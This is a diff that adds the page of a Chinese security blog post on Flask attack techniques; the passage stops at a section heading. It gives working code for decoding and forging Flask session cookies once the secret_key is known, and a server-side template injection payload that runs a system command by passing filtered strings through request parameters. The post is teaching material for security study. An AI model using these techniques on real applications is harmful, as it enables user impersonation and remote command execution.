@@ -1,0 +1,1279 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head><!-- hexo injector head_begin start --><script defer src="/injector/toolbox.js"></script><!-- hexo injector head_begin end -->
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/apple-touch-icon.png">
+  <link rel="icon" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Tr0y">
+  <meta name="keywords" content="Tr0y, tr0y, Hexo, Blog, 博客, 信息安全">
+  
+    <meta name="description" content="SecMap 系列之 Flask，本篇介绍 flask 相关的攻击手法。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SecMap - Flask">
+<meta property="og:url" content="https://www.tr0y.wang/2022/05/16/SecMap-flask/">
+<meta property="og:site_name" content="Tr0y&#39;s Blog">
+<meta property="og:description" content="SecMap 系列之 Flask，本篇介绍 flask 相关的攻击手法。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blogcovers-1252075454.cos.ap-shanghai.myqcloud.com/defaultcover.jpeg/cover">
+<meta property="article:published_time" content="2022-05-16T19:00:00.000Z">
+<meta property="article:modified_time" content="2025-03-19T11:44:53.495Z">
+<meta property="article:author" content="Tr0y">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="SecMap">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blogcovers-1252075454.cos.ap-shanghai.myqcloud.com/defaultcover.jpeg/cover">
+  
+  
+  
+  <title>SecMap - Flask - Tr0y&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/my.css">
+<link rel="stylesheet" href="/css/my-piczoom.css">
+<link rel="stylesheet" href="/css/my-code.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.tr0y.wang","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":60,"cursorChar":"丨","loop":false,"scope":["archives","post","tags","categories","about","links","page","404"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"🌧"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":true,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":5},"lazyload":{"enable":true,"loading_img":"https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":"8e9bf819abf5fa586aeb29b27a17930f","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"HvSx6ik6SYrERWriMqKHJgxY-gzGzoHsz","app_key":"Ehx7kqAi6icjCXaw5jdD5sIs","server_url":"https://hvsx6ik6.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?8e9bf819abf5fa586aeb29b27a17930f";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<!-- hexo injector head_end start --><script defer src="/injector/post.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Tr0y's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Tr0y&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-books"></i>
+                生命线
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-archive-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/gallery/">
+                <i class="iconfont icon-images"></i>
+                摄影集
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/page.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="SecMap - Flask"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-05-16 19:00" pubdate>
+          2022年5月16日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          19k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          119 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar category-bar" style="margin-right: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="经验总结"
+        id="heading-14f81b61393e65e2be86c2b4bcc0434a" role="tab" data-toggle="collapse" href="#collapse-14f81b61393e65e2be86c2b4bcc0434a"
+        aria-expanded="true"
+      >
+        经验总结
+        <span class="list-group-count">(85)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-14f81b61393e65e2be86c2b4bcc0434a"
+           role="tabpanel" aria-labelledby="heading-14f81b61393e65e2be86c2b4bcc0434a">
+        
+        
+          
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2021/12/31/2021/" title="2021 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2021 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/01/12/flag-in-2021/" title="2021，来立些 flag 吧"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2021，来立些 flag 吧</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2023/01/31/2022/" title="2022 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2022 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2024/03/15/2023/" title="2023 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2023 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2024/05/06/%E4%BA%91%E5%8D%97%E4%B9%8B%E6%97%85/" title="2024 云南之旅"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2024 云南之旅</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2025/03/14/2024/" title="2024 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2024 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2025/02/20/%E6%96%90%E6%B5%8E%E4%B9%8B%E6%97%85/" title="2024 🇫🇯 斐济之旅"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2024 🇫🇯 斐济之旅</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2019/06/02/CSRF%E6%8C%87%E5%8C%97/" title="CSRF 指北"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CSRF 指北</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2017/06/07/CtfMiscStega/" title="CTF 杂项之隐写术"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CTF 杂项之隐写术</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2020/09/14/DNS-1-basic/" title="DNS 安全（一）：基础知识复习"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">DNS 安全（一）：基础知识复习</span>
+        </a>
+      
+    
+      
+      
+        <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="list-group-item list-group-item-action">
+          <span class="category-post">More...</span>
+        </a>
+        
+  </div>
+
+          
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="过程记录"
+        id="heading-82bd63cbf8d855f8a95d66283f2e4114" role="tab" data-toggle="collapse" href="#collapse-82bd63cbf8d855f8a95d66283f2e4114"
+        aria-expanded="false"
+      >
+        过程记录
+        <span class="list-group-count">(1)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-82bd63cbf8d855f8a95d66283f2e4114"
+           role="tabpanel" aria-labelledby="heading-82bd63cbf8d855f8a95d66283f2e4114">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2023/12/22/qwb2023-pyjail/" title="2023 强网杯三道 pyjail 的题解"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2023 强网杯三道 pyjail 的题解</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">SecMap - Flask</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>SecMap 系列之 Flask，本篇介绍 flask 相关的攻击手法。</p>
+<span id="more"></span>
+<h2 id="介绍">介绍</h2>
+<p>flask 还是一个非常流行的 Python Web 框架，我个人是非常喜欢的。</p>
+<h2 id="基础知识">基础知识</h2>
+<p>flask 是典型的轻量级 Web 框架，仅保留了核心功能：请求响应处理和模板渲染。这两类功能分别由 Werkzeug（WSGI）完成和 jinja2 负责。</p>
+<p>jinja2 就不用多说了，之前的文章说过。Werkzeug 是一个专门用来处理 HTTP 和 WSGI 的工具库，可以方便的在 Python 中处理 HTTP 协议相关内容。这里顺便提一下，Werkzeug 不是一个 Web 服务器，也不是一个 Web 框架，而是一个工具包，官方的介绍说是一个 WSGI 工具包，它可以作为一个 Web 框架的底层库，因为它封装好了很多 Web 框架需要用到的基本操作，例如 Request，Response 等等。如果橘友们感兴趣可以看官方文档，按照这个文档非常容易上手 Werkzeug（见资料 1）。</p>
+<p>flask 还是比较流行的，教程一抓一大把，基础的使用就不啰嗦了，我们直接来看看 flask 都有哪些攻击面。</p>
+<h2 id="攻击思路">攻击思路</h2>
+<h3 id="常规姿势">常规姿势</h3>
+<p>首先，flask 本身的漏洞本篇就不详细介绍了，大家一搜 CVE 都有（见资料 2），目前来看（2022-05-06），版本 &gt;= <code>0.12.3</code> 是没有通用漏洞的。</p>
+<p>其次，为了避免内容重复，非 flask 直接导致的漏洞不再本篇范围中，例如直接拼接 sql 导致 sql 注入、CSRF、SSRF 等，这些攻击方式并非使用 flask 所导致的，推荐去看 SecMap 的对应系列，更容易理解。</p>
+<h3 id="session-信息泄露-伪造">session 信息泄露 &amp; 伪造</h3>
+<p>session 的作用大家都比较熟悉了，就不用介绍了。</p>
+<p>它的常见实现形式是当用户发起一个请求的时候，后端会检查该请求中是否包含 sessionid，如果没有则会创造一个叫 sessionid 的 cookie，用于区分不同的 session。sessionid 返回给浏览器，并将 sessionid 保存到服务器的内存里面；当已经有了 sessionid，服务端会检查找到与该 sessionid 相匹配的信息直接用。</p>
+<p>所以显而易见，session 和 sessionid 都是后端生成的。且由于 session 是后端识别不同用户的重要依据，而 sessionid 又是识别 session 的唯一依据，所以 session 一般都保存在服务端避免被轻易窃取，只返回随机生成的 sessionid 给客户端。对于攻击者来说，假设需要冒充其他用户，那么必须能够猜到其他用户的 sessionid，这是比较困难的。</p>
+<p>对于 flask 来说，它的 session 不是保存到内存里的，而是直接把整个 session 都塞到 cookie 里返回给客户端。那么这会导致一个问题，如果我可以直接按照格式生成一个 session 放在 cookie 里，那么就可以达到欺骗后端的效果。</p>
+<p>阅读源码可知，flask 生成 session 的时候会进行序列化，主要有以下几个步骤：</p>
+<ol type="1">
+<li>用 <code>json.dumps</code> 将对象转换成 json 字符串</li>
+<li>如果第一步的结果可以被压缩，则用 zlib 库进行压缩</li>
+<li>进行 base64 编码</li>
+<li>通过 secret_key 和 hmac 算法（flask 这里的 hmac 默认用 sha1 进行 hash，还多了一个 salt，默认是 <code>cookie-session</code>）对结果进行签名，将签名附在结果后面（用 <code>.</code> 拼接）。如果第二步有压缩的话，结果的开头会加上 <code>.</code> 标记。</li>
+</ol>
+<p>可以看到，最后一步解决了用户篡改 session 的安全问题，因为在不知道 secret_key 的情况下，是无法伪造签名的。</p>
+<p>所以这会直接导致 2 个可能的安全问题：</p>
+<ol type="1">
+<li>数字签名的作用是防篡改，没有保密的作用。所以 flask 的 session 解开之后可以直接看到明文信息，可能会导致数据泄露</li>
+<li>如果知道 secret_key 那么可以伪造任意有效的 session（这个说法并不完全准确，文末的防御那一小节会说明原因）</li>
+</ol>
+<p>下面举个例子：<br />
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session<br><br><br>app = Flask(__name__)<br>app.secret_key = <span class="hljs-string">&#x27;Tr0y_1s_Macr0phag3&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello</span>():<br>    user = session.get(<span class="hljs-string">&quot;user&quot;</span>, <span class="hljs-string">&quot;Hacker&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;Welcome, <span class="hljs-subst">&#123;user&#125;</span>!&#x27;</span><br><br><br>app.run()<br></code></pre></td></tr></table></figure></p>
+<p>比如这段代码，我们访问之后会得到一个 session：<code>eyJ1c2VyIjoicm9vdCJ9.YnkAHQ.20MEAtmoX7Djup_Irjze03qSnSA</code></p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/b2403caf-03cd-4a2d-acb0-6e10646be004.png!blog#width-zoom6" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>按照生成的过程，我们可以很容易解开 session：<br />
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">In [<span class="hljs-number">76</span>]: session = <span class="hljs-string">&quot;eyJ1c2VyIjoicm9vdCJ9.YnkAHQ.20MEAtmoX7Djup_Irjze03qSnSA&quot;</span><br><br>In [<span class="hljs-number">77</span>]: <span class="hljs-keyword">from</span> itsdangerous <span class="hljs-keyword">import</span> URLSafeTimedSerializer, base64_decode, encoding<br><br>In [<span class="hljs-number">78</span>]: base64_decode(<span class="hljs-string">&quot;eyJ1c2VyIjoicm9vdCJ9&quot;</span>)<br>Out[<span class="hljs-number">78</span>]: <span class="hljs-string">b&#x27;&#123;&quot;user&quot;:&quot;root&quot;&#125;&#x27;</span><br><br>In [<span class="hljs-number">79</span>]: base64_decode(<span class="hljs-string">&quot;YnkAHQ&quot;</span>)<br>Out[<span class="hljs-number">79</span>]: <span class="hljs-string">b&#x27;by\x00\x1d&#x27;</span><br><br>In [<span class="hljs-number">80</span>]: encoding.bytes_to_int(<span class="hljs-string">b&#x27;by\x00\x1d&#x27;</span>)<br>Out[<span class="hljs-number">80</span>]: <span class="hljs-number">1652097053</span><br><br>In [<span class="hljs-number">81</span>]: URLSafeTimedSerializer(<br>    ...:     <span class="hljs-string">&#x27;Tr0y_1s_Macr0phag3&#x27;</span>, <br>    ...:     salt=<span class="hljs-string">&quot;cookie-session&quot;</span>, <br>    ...:     signer_kwargs=&#123;<span class="hljs-string">&quot;key_derivation&quot;</span>: <span class="hljs-string">&quot;hmac&quot;</span>&#125;<br>    ...: ).loads_unsafe(<span class="hljs-string">&quot;eyJ1c2VyIjoicm9vdCJ9.YnkAHQ.20MEAtmoX7Djup_Irjze03qSnSA&quot;</span>)<br>Out[<span class="hljs-number">81</span>]: (<span class="hljs-literal">True</span>, &#123;<span class="hljs-string">&#x27;user&#x27;</span>: <span class="hljs-string">&#x27;root&#x27;</span>&#125;)  <span class="hljs-comment"># 第一个值代表签名是否有效</span><br></code></pre></td></tr></table></figure></p>
+<p>所以如果 session 里有敏感信息，那么直接就泄露了。</p>
+<p>最后，如果搞到 secret_key，可以这样伪造 session：<br />
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> itsdangerous <span class="hljs-keyword">import</span> URLSafeTimedSerializer<br><br><br>URLSafeTimedSerializer(<br>    <span class="hljs-string">&#x27;Tr0y_1s_Macr0phag3&#x27;</span>,<br>    salt=<span class="hljs-string">&quot;cookie-session&quot;</span>,  <span class="hljs-comment"># 这是默认的</span><br>    signer_kwargs=&#123;<span class="hljs-string">&quot;key_derivation&quot;</span>: <span class="hljs-string">&quot;hmac&quot;</span>&#125;<br>).dumps(&#123;<span class="hljs-string">&#x27;user&#x27;</span>: <span class="hljs-string">&#x27;root&#x27;</span>&#125;)<br></code></pre></td></tr></table></figure></p>
+<p>来试试伪造的 session：<br />
+<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/34481fa5-aac1-4f59-acde-5809ed60d1ca.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>nice.</p>
+<p>大家似乎都很喜欢用 <code>flask-session-cookie-manager</code> （见资料 3），但是我不知道它和 <code>itsdangerous.URLSafeTimedSerializer</code> 的区别是啥...这个类既可以解开也可以伪造。难道是没有压缩功能？但是伪造的时候也不需要压缩呀？</p>
+<p>最后教大家一个快速调试的方式。</p>
+<p>我们平时写一些小脚本都需要搞点测试用例来测试，那像 flask 这种 Web 应用，如果每次修改代码都需要重启服务，再通过 HTTP 协议来测试，那实在是太慢了。对于我们安全来说，一样需要测试各种 payload。由于安全一般只需要简单的测试，所以不需要用比较重的测试框架例如 pytest 之类的。所以我们只需要直接用 <code>Flask.test_client</code> 就可以模拟请求了，例如：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template_string, request<br><br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello</span>():<br>    user = request.args.get(<span class="hljs-string">&quot;user&quot;</span>)<br>    <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">f&#x27;&#123;&#123;% autoescape false %&#125;&#125;Welcome, <span class="hljs-subst">&#123;user&#125;</span>!&#123;&#123;%endautoescape%&#125;&#125;&#x27;</span>)<br><br><br>app.test_client().get(<span class="hljs-string">&#x27;/&#x27;</span>, query_string=&#123;<span class="hljs-string">&quot;user&quot;</span>: <span class="hljs-string">&quot;&#123;&#123; 1+1 &#125;&#125;&quot;</span>&#125;).get_data(as_text=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>
+<p><code>test_client</code> 下方法的属性列表可以在 <code>site-packages/werkzeug/test.py</code> 里的 <code>class EnvironBuilder:</code> 下的注释中找到。</p>
+<h3 id="flask-的-ssti">flask 的 SSTI</h3>
+<p>这一节本来是放在《SecMap - SSTI（jinja2）》（见资料 4）中介绍的，但是为了查询的便利性，就放在这里好了，jinja2 那篇文章中会引用这里的知识点。</p>
+<p>flask 最常见的搭档就是 jinja2 了。由于 flask 会引入新的变量，所以也会引入新的姿势。从官方文档可以看到官方引入的新的全局变量（见资料 5）</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/933c3335-74cc-490f-bfc5-7383445de6b6.png!blog#width-zoom7" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<ul>
+<li><code>config</code>：当前配置对象，原型为 <code>flask.Flask().config</code></li>
+<li><code>request</code>：当前 request 对下，原型为 <code>flask.request</code>。注：如果模板渲染的时候 request context 没有激活，这个变量是没法在模板中使用的</li>
+<li><code>session</code>：当前 session 对象，原型是 <code>flask.session</code>。注：如果模板渲染的时候 request context 没有激活，这个变量是没法在模板中使用的</li>
+<li><code>g</code>：全局变量的 request-bound 对象，原型是 <code>flask.g</code>。注：如果模板渲染的时候 request context 没有激活，这个变量是没法在模板中使用的</li>
+<li><code>url_for()</code>，原型是 <code>flask.url_for()</code></li>
+<li><code>get_flashed_messages()</code>：原型是 <code>flask.get_flashed_messages()</code></li>
+</ul>
+<h4 id="通用绕过姿势">通用绕过姿势</h4>
+<p>常规的通用绕过姿势就不重复说了，《SecMap - SSTI（jinja2）》 里说的很全。</p>
+<p>除此之外，flask 的 <code>request</code> 中包含了大量请求相关的属性（见资料 6），可以用于 bypass 一些非常严格的限制。</p>
+<ol type="1">
+<li><code>request.args</code>：GET 请求的参数</li>
+<li><code>request.form</code>：POST 参数</li>
+<li><code>request.values</code>：POST 和 GET 的参数</li>
+<li><code>request.cookies</code>：Cookies 值</li>
+<li><code>request.files</code>：包含了上传的文件名和内容</li>
+<li><code>request.headers</code>：请求头</li>
+<li>直接获取头的属性，上面文档中含有 <code>entity-header field</code> 关键字的都是，比如：
+<ol type="1">
+<li><code>request.authorization</code>：basic 认证的凭据</li>
+<li><code>request.content_type</code>：<code>Content-Type</code> HTTP 头</li>
+<li><code>request.content_md5</code>：<code>Content-MD5</code> HTTP 头</li>
+<li><code>request.get_data</code>：和 <code>request.data</code> 类似</li>
+<li>...</li>
+</ol></li>
+<li><code>request.full_path</code>：完整请求路径，包含参数</li>
+<li><code>request.environ</code>：WSGI 的环境变量，包含 HTTP 头（对应的键会自动加上 <code>HTTP_</code> 前缀），还有 WSGI 服务端的一些信息</li>
+<li>以及通过 mro 我们也是可以间接获取到这些属性的。</li>
+</ol>
+<p>这些请求相关的属性可以传递任何被过滤的字符串。举例，假设参数 user 过滤了 <code>os</code>、<code>system</code>，那我们可以任意指定另外三个参数，分别用于传递 <code>os</code>、<code>system</code>、命令，payload 可以这样：<br />
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py">?user=&#123;&#123;config.get_namespace.__globals__[request.args.module][request.args.func](request.args.cmd)&#125;&#125;<br>&amp;module=os<br>&amp;func=system<br>&amp;cmd=whoami<br></code></pre></td></tr></table></figure></p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/3ce21907-892f-4068-befa-33802ef4de56.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>这个姿势是非常非常通用的。利用的时候，最重要的资料还是官方文档。</p>
+<h4 id="通过-mro-寻找可利用模块">通过 mro 寻找可利用模块</h4>
+<p>mro 直接利用 dibber 搜索就行（见资料 7）</p>
+<blockquote>
+<p>config</p>
+</blockquote>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/f704705f-df49-4068-93d2-9e4c660ce06b.png!blog#width-zoom8" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<blockquote>
+<p>g</p>
+</blockquote>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/9c934cd6-29f1-448c-8295-2957a6a83fc2.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>其他同理，就不列举了，橘友们用 dibber 自行尝试即可。</p>
+<h4 id="config-信息泄露">config 信息泄露</h4>
